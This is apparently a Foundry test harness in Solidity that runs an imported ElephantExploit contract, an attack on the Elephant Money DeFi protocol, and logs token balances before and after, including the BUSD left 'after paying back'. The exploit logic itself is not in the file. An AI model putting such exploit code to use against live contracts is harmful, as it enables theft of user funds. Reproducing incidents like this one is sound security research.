// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;


import "forge-std/Test.sol";

import "forge-std/console2.sol";

import "../ElephantExploit.sol";

import {IERC20} from "../interfaces/IERC20.sol";

import {IWBNB} from "../interfaces/IWBNB.sol";

contract ElephantExploitTest is Test {
    ElephantExploit public exploit;
    IWBNB wbnb;
    IERC20 elephant;
    IERC20 trunk;
    IERC20 busd;
    address public bob = 0x00a329c0648769A73afAc7F9381E08FB43dBEA72;

    function setUp() public {

        startHoax(bob);
        exploit = new ElephantExploit();
        wbnb = exploit.wbnb();
        elephant = exploit.elephant();
        trunk = exploit.trunk();
        busd = exploit.busd();
    }

    function testExploit() public {
        console2.log(
            unicode"üí∞ Initial WBNB balance",
            wbnb.balanceOf(address(exploit)) / 1e18
        );
        console2.log(
            unicode"üêò Initial Elephant balance",
            elephant.balanceOf(address(exploit)) / 1e9
        );
        console2.log(
            unicode"üåé Initial trunk balance",
            trunk.balanceOf(address(exploit)) / 1e18
        );
        console2.log("");
        exploit.initialCall();
        console2.log(
            unicode"üí∏ The BUSD after paying back",
            busd.balanceOf(address(exploit)) / 1e18
        );
    }
}
